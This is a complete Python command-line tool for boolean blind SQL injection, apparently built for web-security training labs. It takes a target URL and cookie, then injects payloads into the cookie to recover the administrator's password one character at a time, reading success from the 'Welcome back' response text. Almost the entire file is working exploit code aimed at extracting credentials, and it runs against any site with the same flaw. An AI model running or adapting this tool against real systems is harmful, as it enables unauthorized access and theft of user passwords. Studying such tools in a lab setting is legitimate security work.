#!/usr/bin/env python3
import sys
import string
import requests

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    print("""
    ====================================================================
               Blind SQL Injection Automation Tool (CLI)              
    ====================================================================
    [+] Creator   : M Haidar                              
    [+] LinkedIn  : https://www.linkedin.com/in/haidarobs            
    [+] GitHub    : https://github.com/mdhaidarobs                   
    ====================================================================
    """)

def main():
    banner()

    # User Inputs for Full Control
    print("[*] Please provide the configuration details below:\n")
    
    url = input("Enter Target Lab URL (e.g., https://example.com/): ").strip()
    if not url.startswith("http"):
        print("[-] Error: URL must start with http:// or https://")
        sys.exit(1)

    base_tracking_id = input("Enter your Base Tracking ID value: ").strip()
    
    cookie_name = input("Enter Cookie Name vulnerable to SQLi [Default: TrackingId]: ").strip()
    if not cookie_name:
        cookie_name = "TrackingId"

    other_cookies_input = input("Enter any other required cookies (format name=value; name2=value2) or leave blank: ").strip()
    
    target_user = input("Enter Username to target [Default: administrator]: ").strip()
    if not target_user:
        target_user = "administrator"

    try:
        max_length = int(input("Enter expected password length (e.g., 20): ").strip())
    except ValueError:
        print("[-] Error: Length must be an integer number.")
        sys.exit(1)

    # Proxy support for Burp Suite (Optional)
    use_proxy = input("Do you want to route traffic through Burp Suite proxy (127.0.0.1:8080)? (y/N): ").strip().lower()
    proxies = None
    if use_proxy == 'y':
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }
        print("[*] Proxy enabled: Traffic will route through Burp Suite.")

    # Parse extra cookies if provided
    cookies_dict = {}
    if other_cookies_input:
        for c in other_cookies_input.split(";"):
            if "=" in c:
                k, v = c.strip().split("=", 1)
                cookies_dict[k] = v

    characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    
    print(f"\n[+] Starting enumeration for user: '{target_user}' (Password Length: {max_length})")
    print("-" * 68)

    password = ""
    for position in range(1, max_length + 1):
        found = False
        for char in characters:
            payload = f"{base_tracking_id}' and (select substring(password,{position},1) from users where username='{target_user}')='{char}'--"

            # Set current request cookies
            current_cookies = cookies_dict.copy()
            current_cookies[cookie_name] = payload

            try:
                response = requests.get(
                    url, 
                    cookies=current_cookies, 
                    proxies=proxies, 
                    verify=False, 
                    timeout=10
                )
                
                if "Welcome back" in response.text:
                    password += char
                    sys.stdout.write(f"\r[+] Progress: [{password}]")
                    sys.stdout.flush()
                    found = True
                    break

            except requests.exceptions.RequestException as e:
                print(f"\n[-] Request failed: {e}")
                sys.exit(1)

        if not found:
            print(f"\n[-] Character not found at position {position}. Check your payload or length.")
            break

    print("\n" + "-" * 68)
    print(f"[+] Enumeration Complete!")
    print(f"[+] Password for '{target_user}' is: {password}")

if __name__ == "__main__":
    main()